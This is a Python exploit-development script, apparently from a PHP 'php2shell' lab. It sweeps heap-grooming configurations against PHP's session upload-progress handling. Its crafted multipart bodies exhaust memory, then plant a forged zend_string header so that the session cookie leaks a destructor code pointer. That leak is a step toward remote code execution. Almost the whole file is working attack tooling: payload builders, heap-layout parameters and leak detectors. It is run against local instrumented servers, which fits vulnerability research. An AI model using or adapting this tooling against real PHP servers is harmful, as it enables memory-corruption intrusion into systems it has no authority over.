#!/usr/bin/env python3
"""Fit sweep v2: the two knobs the reference PoC used that we never swept, now
measured with a probe that cannot be blinded by the headers_sent guard.

v1 lost 28 of 32 configs to a measurement blind spot: probe A lives below
`if (SG(headers_sent)) return FAILURE;` in php_session_send_cookie(), so any run
where PHP warns before sending headers logged "no cookie, no record" even though
PS(id) had been dereferenced. This build adds:

  probe A0 - entry of php_session_send_cookie(), before the guard. Recovers
             every call, and reports send_cookie/headers_sent.
  probe D  - ppid2sid(), right after the id is adopted from the
             upload-progress field. Shows the adopted id string's class.

Knobs (unchanged from v1):
  A. the PHPSESSID *field value length*, both sides - the id string is the
     object whose chunk PS(id) is read from, and segregated fit means its
     length picks the class of everything that can ever land there.
  B. the repeated-key churn, with the PoC's 79-byte forged zend_string header.

Win criterion is the PoC's own: a Set-Cookie whose 16 bytes are
{16, pDestructor} - or, with the entry probe, PS(id) reading as HashTable+0x10.
"""
import fcntl
import os
import re
import struct
import sys
import time
import traceback

sys.path[:0] = ["/opt/data/php2shell-lab", "/opt/data/lab-scratch"]
import stage2 as S2          # noqa: E402
import step4_reach as R      # noqa: E402

OUT = "/opt/data/lab-scratch/fitsweep2.log"
EVID = "/opt/data/lab-scratch/fitsweep2-logs"
DTOR_LOW21 = 0x112930
PGEO = dict(depth=58, count=935, field_count=65, value_size=39)

PRODUCER_IDS = [("P-NUL", b"\x00"), ("P-16", b"a" * 16),
                ("P-37", b"a" * 37), ("P-56", b"a" * 56)]
CONSUMER_IDS = [("C-a", b"a"), ("C-24", b"a" * 24),
                ("C-37", b"a" * 37), ("C-56", b"a" * 56)]

A_HDR = re.compile(
    r"\[INSTR-A\] PS\(id\)=0x([0-9a-f]+) val=0x([0-9a-f]+) len=(\d+) "
    r"gc_refcount=(\d+) gc_type=0x([0-9a-f]+)")
A0_HDR = re.compile(
    r"\[INSTR-A0\] entry PS\(id\)=0x([0-9a-f]+) val=0x([0-9a-f]+) len=(\d+) "
    r"gc_refcount=(\d+) gc_type=0x([0-9a-f]+) send_cookie=(-?\d+) headers_sent=(\d+)")
D_HDR = re.compile(
    r"\[INSTR-D\] ppid2sid PS\(id\)=0x([0-9a-f]+) val=0x([0-9a-f]+) len=(\d+) "
    r"gc_refcount=(\d+) gc_type=0x([0-9a-f]+)")
BYT = re.compile(r"\[INSTR-(A0|A|D)\] bytes\((\d+)\):(.*)")


def part(name, value=b"", filename=None):
    return S2.part(name, value, filename)


def producer(geom, id_value=b"\x00"):
    parts = [part(("p%04d" % i).encode(), b"x" * geom["value_size"])
             for i in range(geom["field_count"])]
    parts += [part(b"PHPSESSID", id_value),
              part(b"PHP_SESSION_UPLOAD_PROGRESS", b"ppp"),
              part(b"f", b"A" * 64, b"a.txt")]
    for i in range(geom["count"]):
        parts.append(part(b"f[" + str(i).encode() + b"]" + b"[x]" * geom["depth"],
                          filename=b""))
    return S2.body(parts)


def forged(value_size=79, forged_len=256):
    f = bytearray(b"A" * value_size)
    struct.pack_into("<Q", f, 0x10, forged_len)
    f[0x18] = ord("L")
    return bytes(f)


def consumer(id_value=b"a", value_size=24, fields=73, array_at=69, array_len=16,
             array_value=16, repeat_key=None, repeat_count=0, repeat_value=None):
    parts = [part(b"PHPSESSID", id_value), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    for i in range(fields):
        parts.append(part(("s%04d" % i).encode(), b"P" * value_size))
    for i in range(983 - fields):
        for j in range(array_len if i == array_at else 1):
            parts.append(part(("a%04d[%d]" % (i, j)).encode(), b"x" * array_value))
    if repeat_key:
        for _ in range(repeat_count):
            parts.append(part(repeat_key, repeat_value if repeat_value else b"q" * 16))
    return S2.body(parts)


def log(msg):
    print(msg, flush=True)
    with open(OUT, "a") as fh:
        fh.write(msg + "\n")


def probe_reads(path):
    """Every probe record in the log, oldest first, tagged with its site."""
    try:
        lines = open(path, "rb").read().decode("utf-8", "replace").splitlines()
    except OSError:
        return []
    recs = []
    for i, line in enumerate(lines):
        rec = None
        m = A0_HDR.search(line)
        if m:
            rec = dict(site="A0", addr=int(m.group(1), 16), val=int(m.group(2), 16),
                       len=int(m.group(3)), refcount=int(m.group(4)),
                       type=int(m.group(5), 16), send_cookie=int(m.group(6)),
                       headers_sent=int(m.group(7)))
        else:
            m = D_HDR.search(line)
            if m:
                rec = dict(site="D", addr=int(m.group(1), 16), val=int(m.group(2), 16),
                           len=int(m.group(3)), refcount=int(m.group(4)),
                           type=int(m.group(5), 16))
            else:
                m = A_HDR.search(line)
                if m:
                    rec = dict(site="A", addr=int(m.group(1), 16), val=int(m.group(2), 16),
                               len=int(m.group(3)), refcount=int(m.group(4)),
                               type=int(m.group(5), 16))
        if rec is None:
            continue
        dump = b""
        if i + 1 < len(lines):
            mb = BYT.search(lines[i + 1])
            if mb:
                dump = bytes(int(t, 16) for t in mb.group(3).split())
        rec["dump"] = dump
        recs.append(rec)
    return recs


def read_verdict(rec):
    b, n = rec["dump"], rec["len"]
    if n == 32 and len(b) >= 32 and all(chr(c) in "0123456789abcdef" for c in b[:32]):
        return "healthy-id"
    if n == 16 and len(b) >= 16:
        first = int.from_bytes(b[0:8], "little")
        second = int.from_bytes(b[8:16], "little")
        if first == 16 and (second & 0x1FFFFF) == DTOR_LOW21:
            return "*** CODE-POINTER %#x ***" % second
        return "len16 first=%d second=%#x low21=%#x" % (first, second, second & 0x1FFFFF)
    if len(b) >= 8 and len(set(b[:8])) == 1:
        return "contained-fill-%02x (len=%d)" % (b[0], n)
    if not b and n:
        return "stale len=%d (no bytes)" % n
    return "stale len=%d first8=%s" % (n, b[:8].hex() or "n/a")


def wire_verdict(sid):
    if sid is None:
        return "no-cookie"
    if len(sid) == 16 and int.from_bytes(sid[0:8], "little") == 16:
        v = int.from_bytes(sid[8:16], "little")
        return "*** CODE-POINTER-WIRE %#x low21=%#x ***" % (v, v & 0x1FFFFF)
    if len(sid) == 32 and all(chr(c) in "0123456789abcdef" for c in sid):
        return "healthy-id"
    return "id len=%d %s" % (len(sid), sid[:16].hex())


def one(idx, tag, prod_bytes, cons_bytes):
    port = 19600 + (idx % 380)
    srv = None
    try:
        srv = R.start_server(port)
        prod_raw = S2.send(port, prod_bytes, cookies=S2.COOKIE_PAIRS)
        _, ptags = S2.classify(prod_raw)
        if "OOM" not in " ".join(str(t) for t in ptags):
            return "PRODUCER DID NOT OOM tags=%s -> INVALID" % (ptags,), None, ""
        n_before = len(probe_reads(R.LOG))
        try:
            cons_raw = S2.send(port, cons_bytes)
        except OSError as exc:
            return "consumer raised %s" % exc, None, ""
        sid = S2.session_id(cons_raw) if cons_raw else None
        time.sleep(0.3)
        new = probe_reads(R.LOG)[n_before:]
        with open(os.path.join(EVID, "%03d-%s.log" % (idx, tag)), "wb") as fh:
            fh.write(open(R.LOG, "rb").read())
        pick = [r for r in new if r["site"] == "A0"] or [r for r in new if r["site"] == "A"]
        drec = [r for r in new if r["site"] == "D"]
        if pick:
            r = pick[-1]
            rv = read_verdict(r)
            flags = "send_cookie=%d headers=%d" % (r.get("send_cookie", -1),
                                                   r.get("headers_sent", -1))
        else:
            rv, flags = "NO PS(id) DEREF (probe A0/A never fired)", "-"
        dd = "D:len=%d type=0x%x" % (drec[-1]["len"], drec[-1]["type"]) if drec else "D:none"
        return rv, wire_verdict(sid), flags + " " + dd
    finally:
        if srv is not None:
            R.stop_server(srv)


LOCK_FH = None


def main():
    global LOCK_FH
    LOCK_FH = open("/opt/data/lab-scratch/fitsweep2.lock", "w")
    try:
        fcntl.flock(LOCK_FH, fcntl.LOCK_EX | fcntl.LOCK_NB)
    except OSError:
        print("another fitsweep2 instance holds the lock; refusing", flush=True)
        return 2
    LOCK_FH.write("pid=%d\n" % os.getpid())
    LOCK_FH.flush()
    os.makedirs(EVID, exist_ok=True)
    open(OUT, "a").write("\n=== fit sweep v2 start %s pid=%d ===\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), os.getpid()))
    idx, wins, stale, valid = 0, [], [], 0

    phase_a = [(pn, pv, cn, cv, None, 0, None)
               for pn, pv in PRODUCER_IDS for cn, cv in CONSUMER_IDS]
    phase_b = [(pn, pv, cn, cv, b"1050", k, shape)
               for pn, pv in PRODUCER_IDS[:2] for cn, cv in CONSUMER_IDS[:2]
               for k in (16, 64) for shape in ("plain", "forged")]
    cfgs = phase_a + phase_b
    if "--smoke" in sys.argv:
        cfgs = phase_a[:1]

    for pn, pv, cn, cv, rk, k, shape in cfgs:
        idx += 1
        repeat_value = None
        if shape == "plain":
            repeat_value = b"q" * 24
        elif shape == "forged":
            repeat_value = forged()
        label = "%s+%s%s" % (pn, cn, ("+rk%d-%s" % (k, shape)) if rk else "")
        pbytes = producer(PGEO, pv)
        cbytes = consumer(id_value=cv, repeat_key=rk, repeat_count=k,
                          repeat_value=repeat_value)
        try:
            rv, wv, extra = one(idx, label, pbytes, cbytes)
        except Exception:
            log("  %-22s : EXCEPTION\n%s" % (label, traceback.format_exc()))
            continue
        if "INVALID" in rv:
            log("  %-22s : %s" % (label, rv))
            continue
        valid += 1
        if "CODE-POINTER" in rv or (wv and "CODE-POINTER" in wv):
            wins.append(label)
        line = "  %-22s : probeA=%-34s wire=%-20s %s" % (label, rv, wv, extra)
        if rv != "healthy-id":
            stale.append(label)
            idx += 1
            rv2, wv2, _ = one(idx, label + "-rerun", pbytes, cbytes)
            line += "  [rerun probeA=%s]" % rv2
        log(line)

    log("\n=== fit sweep v2 done %s  configs=%d valid=%d stale=%d wins=%d ==="
        % (time.strftime("%Y-%m-%d %H:%M:%S"), idx, valid, len(stale), len(wins)))
    if stale:
        log("  stale: " + ", ".join(stale))
    for w in wins:
        log("  *** WIN %s ***" % w)


if __name__ == "__main__":
    main()
